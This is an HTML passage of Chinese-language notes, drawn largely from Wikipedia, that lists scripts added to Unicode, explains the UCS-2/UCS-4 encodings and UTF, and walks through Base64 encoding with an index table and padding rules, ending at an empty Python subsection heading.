href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%B8%8C%E8%85%8A%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">古希腊音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%8E%98%E6%96%87">巴厘文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A5%94%E5%BD%A2%E6%96%87%E5%AD%97">楔形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%9D%9E%E4%B9%A6%E9%9D%A2%E6%96%87%E5%AD%97">西非书面文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%85%AB%E6%80%9D%E5%B7%B4%E6%96%87">八思巴文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%85%93%E5%B0%BC%E5%9F%BA%E5%AD%97%E6%AF%8D">腓尼基字母</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%A1%E5%88%A9%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">卡利亚文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A0%E5%A9%86%E5%AD%97%E6%AF%8D">占婆字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%85%8B%E8%80%B6%E9%BB%8E%E6%96%87&amp;action=edit&amp;redlink=1">克耶黎文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BB%92%E5%B7%B4%E6%96%87">绒巴文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%88%A9%E8%A5%BF%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">利西亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%90%95%E5%BA%95%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">吕底亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A1%91%E5%A1%94%E5%88%A9%E6%96%87&amp;action=edit&amp;redlink=1">桑塔利文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%8B%89%E8%AE%A9%E6%96%87&amp;action=edit&amp;redlink=1">拉让文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%B4%A2%E6%8B%89%E4%BB%80%E7%89%B9%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">索拉什特拉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%BD%E4%BB%96%E6%96%87&amp;action=edit&amp;redlink=1">巽他文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E4%BC%8A%E6%96%87&amp;action=edit&amp;redlink=1">瓦伊文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%96%90%E6%96%AF%E6%89%98%E6%96%AF%E5%9C%93%E7%9B%A4">斐斯托斯圆盘</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%BB%E5%B0%86">麻将</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%B1%B3%E8%AF%BA%E9%AA%A8%E7%89%8C">多米诺骨牌</a>上的符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E7%BB%B4%E6%96%AF%E9%99%80%E6%96%87&amp;action=edit&amp;redlink=1">阿维斯陀文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%A7%86%E7%A9%86%E6%96%87%E5%AD%97">巴姆穆文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%8F%8A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97">埃及象形文字</a> （<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%B1%80%E7%B4%8D%E7%AC%A6%E8%99%9F%E8%A1%A8">加汀纳符号表</a>，涵盖1071个符号），<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E6%8B%89%E5%A7%86%E6%96%87">亚拉姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E6%8B%89%E7%BB%B4%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">巴拉维碑铭体</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E6%8F%90%E4%BA%9A%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">帕提亚碑铭体</a>，<a href="https://zh.wikipedia.org/wiki/%E7%88%AA%E5%93%87%E6%96%87">爪哇文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%87%B1%E6%8F%90%E6%96%87">凯提文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%88%E5%83%B3%E6%96%87">老傈僳文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E5%B0%BC%E6%99%AE%E5%B0%94%E6%96%87&amp;action=edit&amp;redlink=1">曼尼普尔文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%97%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">南阿拉伯字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E7%AA%81%E5%8E%A5%E6%96%87">古突厥文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%92%92%E7%8E%9B%E5%88%A9%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">撒玛利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%A3%E6%96%87">老傣文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%82%A3%E9%BB%AF%E8%AA%9E">傣越文</a>。、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E5%A1%94%E5%85%8B%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴塔克字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A9%86%E7%BD%97%E7%B1%B3%E6%96%87%E5%AD%97">婆罗米文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E8%BE%BE%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">曼达字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%B8%E7%89%8C">纸牌</a>符号，<a href="https://zh.wikipedia.org/wiki/%E4%BA%A4%E9%80%9A%E6%A0%87%E5%BF%97">交通标志</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%9B%BE">地图</a>符号，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%82%BC%E9%87%91%E6%9C%AF%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">炼金术符号</a>，<a href="https://zh.wikipedia.org/wiki/%E9%A2%9C%E6%96%87%E5%AD%97">颜文字</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9F%A5%E5%85%8B%E9%A9%AC%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">查克马字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%A6%E7%BD%97%E5%9F%83%E6%96%87">麦罗埃文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BA%A6%E7%BD%97%E5%9F%83%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">麦罗埃象形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9F%8F%E6%A0%BC%E7%90%86%E8%8B%97%E6%96%87">柏格理苗文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A4%8F%E6%8B%89%E9%81%94%E6%96%87">夏拉达文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%8B%89%E5%83%A7%E5%B9%B3%E6%96%87%E5%AD%97">索拉僧平文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B3%B0%E5%85%8B%E9%87%8C%E6%96%87&amp;action=edit&amp;redlink=1">泰克里文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9C%9F%E8%80%B3%E5%85%B6%E9%87%8C%E6%8B%89%E7%AC%A6%E5%8F%B7">土耳其里拉符号</a>、5个双向排版符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E8%90%A8%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴萨字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%AB%98%E5%8A%A0%E7%B4%A2%E9%98%BF%E5%B0%94%E5%B7%B4%E5%B0%BC%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">高加索阿尔巴尼亚字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9D%9C%E6%99%AE%E9%9B%B7%E5%9A%B4%E9%80%9F%E8%A8%98&amp;action=edit&amp;redlink=1">杜普雷严速记</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%88%B1%E5%B0%94%E5%B7%B4%E6%A1%91%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">爱尔巴桑字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%85%B0%E5%A1%94%E6%96%87">古兰塔文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%AF%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">可吉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BA%93%E8%BE%BE%E7%93%A6%E8%BF%AA%E6%96%87&amp;action=edit&amp;redlink=1">库达瓦迪文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97A">线形文字A</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E5%93%88%E4%BD%B3%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">马哈佳尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%BC%E6%95%99%E5%AD%97%E6%AF%8D">摩尼教字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%97%A8%E5%BE%97%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">门得文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%8E%AB%E8%BF%AA%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">莫迪字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BB%98%E6%96%87&amp;action=edit&amp;redlink=1">默文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%8D%E5%B7%B4%E6%B3%B0%E5%AD%97%E6%AF%8D">纳巴泰字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%8C%97%E9%98%BF%E6%8B%89%E4%BC%AF%E6%96%87&amp;action=edit&amp;redlink=1">古北阿拉伯文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%BD%BC%E7%88%BE%E5%A7%86%E6%96%87">古彼尔姆文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9D%A8%E6%9D%BE%E5%BD%95%E8%8B%97%E6%96%87">杨松录苗文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E7%B1%B3%E6%8B%89%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">帕米拉文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%A2%8D%E6%B8%85%E8%B1%AA%E6%96%87&amp;action=edit&amp;redlink=1">袍清豪文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%AF%97%E7%AF%87%E5%B7%B4%E5%88%97%E7%BB%B4%E6%96%87&amp;action=edit&amp;redlink=1">诗篇巴列维文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%82%89%E6%9B%87%E6%96%87%E5%AD%97">悉昙文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BA%95%E7%BD%97%E4%BB%86%E5%A4%9A%E6%96%87">底罗仆多文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E5%85%B0%E9%BD%90%E5%9C%B0%E6%96%87&amp;action=edit&amp;redlink=1">瓦兰齐地文</a>、<a href="https://zh.wikipedia.org/wiki/Dingbat">装饰符号</a>、<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%B4%AA%E5%A7%86%E6%96%87">阿洪姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%AE%89%E7%BA%B3%E6%89%98%E5%88%A9%E4%BA%9A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">安纳托利亚象形文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%9D%A6%E6%96%87&amp;action=edit&amp;redlink=1">哈坦文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%A9%86%E5%B0%94%E5%A1%94%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">穆尔塔尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%8C%88%E7%89%99%E5%88%A9%E5%AD%97%E6%AF%8D">古匈牙利字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E4%B9%A6%E5%86%99%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">书写符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>小写字母，以及五种<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a><a href="https://zh.wikipedia.org/wiki/%E8%86%9A%E8%89%B2">肤色</a>修改字符、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E5%BE%B7%E6%8B%89%E5%A7%86%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">阿德拉姆字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%AF%94%E5%A5%87%E8%88%92%E5%A5%87%E6%96%87&amp;action=edit&amp;redlink=1">比奇舒奇文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%B1%A1%E9%9B%84%E6%96%87">象雄文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B0%BC%E6%B3%8A%E5%B0%94%E7%BA%BD%E7%93%A6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">尼泊尔纽瓦字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%AC%A7%E5%A1%9E%E5%A5%87%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">欧塞奇字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%A4%8F%E6%96%87">西夏文</a>、绘字文、<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E6%96%87%E5%AD%97">札那巴札尔</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%B0%B8%E5%B8%83%E6%96%87%E5%AD%97">索永布文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E8%90%A8%E6%8B%89%E5%A7%86%E8%B4%A1%E5%BE%B7%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">马萨拉姆贡德文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%B3%E4%B9%A6">女书</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AE%8A%E9%AB%94%E5%81%87%E5%90%8D">变体假名</a>（非标准<a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>）、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A4%9A%E6%A0%BC%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">多格拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%96%AC%E6%B2%BB%E4%BA%9E%E6%96%87">格鲁吉亚文</a>骑士体大写字母、<a href="https://zh.wikipedia.org/w/index.php?title=%E8%B4%A1%E8%B4%BE%E6%8B%89%E8%B4%A1%E5%BE%B7%E6%96%87&amp;action=edit&amp;redlink=1">贡贾拉贡德文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%88%E4%B9%83%E6%96%90%E7%BE%85%E8%88%88%E4%BA%9E%E6%96%87%E5%AD%97">哈乃斐罗兴亚文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9C%9B%E5%8A%A0%E9%94%A1%E6%96%87&amp;action=edit&amp;redlink=1">望加锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A2%85%E5%BE%B7%E6%B3%95%E4%BC%8A%E5%BE%B7%E6%9E%97%E6%96%87&amp;action=edit&amp;redlink=1">梅德法伊德林文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E7%B2%9F%E7%89%B9%E6%96%87">老粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B2%9F%E7%89%B9%E6%96%87">粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%88%A9%E9%82%81%E6%96%87">埃利迈文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%97%E8%BF%AA%E5%9F%8E%E6%96%87&amp;action=edit&amp;redlink=1">南迪城文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%89%B5%E4%B8%96%E7%B4%80%E8%8B%97%E6%96%87">创世纪苗文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%96%87%E4%B9%94%E6%96%87&amp;action=edit&amp;redlink=1">文乔文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8A%B1%E5%89%8C%E5%AD%90%E6%A8%A1%E8%AF%AD">花剌子模语</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BF%AA%E7%BB%B4%E8%A5%BF%E8%AF%AD">迪维西语</a>的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B3%B6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">岛字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%91%E4%B8%B9%E5%B0%8F%E5%AD%97">契丹小字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">库尔德语字母</a>的<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">Yezidi体</a>、书写<a href="https://zh.wikipedia.org/wiki/%E8%B1%AA%E8%90%A8%E8%AF%AD">豪萨语</a>用的阿拉伯附加字母、<a href="https://zh.wikipedia.org/wiki/%E6%B2%83%E6%B4%9B%E5%A4%AB%E8%AA%9E">沃洛夫语</a>、其他非洲语言、在巴基斯坦书写<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%B0%E5%BE%B7%E7%A7%91%E8%AA%9E&amp;action=edit&amp;redlink=1">印德科语</a>和<a href="https://zh.wikipedia.org/wiki/%E6%97%81%E9%81%AE%E6%99%AE%E8%AA%9E">旁遮普语</a>的补充字符、<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E">粤语</a>用的<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB%E5%89%B5%E6%84%8F">共享创意</a>授权符号、七十或八十年代电讯用图符。</p>
<h3 id="unicode编码系统可分为编码方式和实现方式两个层次">Unicode编码系统可分为编码方式和实现方式两个层次。</h3>
<p>目前实际应用的统一码版本对应于<a href="https://zh.wikipedia.org/wiki/UCS-2">UCS-2</a>，使用16<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">位</a>的编码空间。也就是每个字符占用2个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>。这样理论上一共最多可以表示216（即65536）个字符。基本满足各种语言的使用。<br>
UCS-4是一个更大的尚未填充完全的31位字符集，加上恒为0的首位，共需占据32位，即4字节。理论上最多能表示231个字符，完全可以涵盖一切语言所用的符号。<br>
基本多文种平面的字符的编码为<em>U+hhhh</em>，其中每个<em>h</em>代表一个<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a>数字，与UCS-2编码完全相同。而其对应的4字节UCS-4编码后两个字节一致，前两个字节则所有位均为0。<br>
Unicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输过程中，由于不同<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">系统平台</a>的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称为<strong>Unicod转换格式</strong>（Unicode Transformation Format，简称为UTF）。</p>
<p><a href="https://zh.wikipedia.org/wiki/Unicode">Unicode_wiki百科</a></p>
<h2 id="base64">base64</h2>
<p><strong>Base64</strong>是一种基于64个可打印字符来表示<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制数据</a>的表示方法。由于{\displaystyle \log _{2}64=6}<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9c986fbdc6c036a937e0647d7a6ec5ad745bccab" alt="{\displaystyle \log _{2}64=6}" loading="lazy">，所以每6个<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">比特</a>为一个单元，Base64常用于在通常处理文本<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE">数据</a>的场合，表示、传输、存储一些二进制数据，包括<a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>的<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">电子邮件</a>及<a href="https://zh.wikipedia.org/wiki/XML">XML</a>的一些复杂数据。</p>
<ul>
<li>编码“Man”</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">文本</th>
<th>M</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>A</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>N</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ASCII编码</td>
<td>77</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>97</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>110</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">二进制位</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td style="text-align:center">索引</td>
<td>19</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>22</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>46</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">Base64编码</td>
<td><strong>T</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>W</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>F</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>u</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>在此例中，Base64算法将3个字节编码为4个字符。</p>
<p>Base64索引表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">A</td>
<td style="text-align:center">16</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">32</td>
<td style="text-align:center">g</td>
<td style="text-align:center">48</td>
<td style="text-align:center">w</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">B</td>
<td style="text-align:center">17</td>
<td style="text-align:center">R</td>
<td style="text-align:center">33</td>
<td style="text-align:center">h</td>
<td style="text-align:center">49</td>
<td style="text-align:center">x</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">C</td>
<td style="text-align:center">18</td>
<td style="text-align:center">S</td>
<td style="text-align:center">34</td>
<td style="text-align:center">i</td>
<td style="text-align:center">50</td>
<td style="text-align:center">y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">D</td>
<td style="text-align:center">19</td>
<td style="text-align:center">T</td>
<td style="text-align:center">35</td>
<td style="text-align:center">j</td>
<td style="text-align:center">51</td>
<td style="text-align:center">z</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">E</td>
<td style="text-align:center">20</td>
<td style="text-align:center">U</td>
<td style="text-align:center">36</td>
<td style="text-align:center">k</td>
<td style="text-align:center">52</td>
<td style="text-align:center">0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">F</td>
<td style="text-align:center">21</td>
<td style="text-align:center">V</td>
<td style="text-align:center">37</td>
<td style="text-align:center">l</td>
<td style="text-align:center">53</td>
<td style="text-align:center">1</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">G</td>
<td style="text-align:center">22</td>
<td style="text-align:center">W</td>
<td style="text-align:center">38</td>
<td style="text-align:center">m</td>
<td style="text-align:center">54</td>
<td style="text-align:center">2</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">H</td>
<td style="text-align:center">23</td>
<td style="text-align:center">X</td>
<td style="text-align:center">39</td>
<td style="text-align:center">n</td>
<td style="text-align:center">55</td>
<td style="text-align:center">3</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">I</td>
<td style="text-align:center">24</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">40</td>
<td style="text-align:center">o</td>
<td style="text-align:center">56</td>
<td style="text-align:center">4</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">J</td>
<td style="text-align:center">25</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">41</td>
<td style="text-align:center">p</td>
<td style="text-align:center">57</td>
<td style="text-align:center">5</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">K</td>
<td style="text-align:center">26</td>
<td style="text-align:center">a</td>
<td style="text-align:center">42</td>
<td style="text-align:center">q</td>
<td style="text-align:center">58</td>
<td style="text-align:center">6</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">L</td>
<td style="text-align:center">27</td>
<td style="text-align:center">b</td>
<td style="text-align:center">43</td>
<td style="text-align:center">r</td>
<td style="text-align:center">59</td>
<td style="text-align:center">7</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">M</td>
<td style="text-align:center">28</td>
<td style="text-align:center">c</td>
<td style="text-align:center">44</td>
<td style="text-align:center">s</td>
<td style="text-align:center">60</td>
<td style="text-align:center">8</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">N</td>
<td style="text-align:center">29</td>
<td style="text-align:center">d</td>
<td style="text-align:center">45</td>
<td style="text-align:center">t</td>
<td style="text-align:center">61</td>
<td style="text-align:center">9</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">O</td>
<td style="text-align:center">30</td>
<td style="text-align:center">e</td>
<td style="text-align:center">46</td>
<td style="text-align:center">u</td>
<td style="text-align:center">62</td>
<td style="text-align:center">+</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">P</td>
<td style="text-align:center">31</td>
<td style="text-align:center">f</td>
<td style="text-align:center">47</td>
<td style="text-align:center">v</td>
<td style="text-align:center">63</td>
<td style="text-align:center">/</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>大致过程：先将文本转为ascii码，再转为8位2进制数，再取其中6位得出对应的十进制数，再通过索引表中转换为字符</p>
<p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个<code>=</code>号，代表补足的字节数。说，当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p>
<h3 id="base64解码">base64解码</h3>
<p><a href="http://tool.chinaz.com/Tools/Base64.aspx">在线解码编码网站</a></p>
<h3 id="base64_python">base64_python</h3>
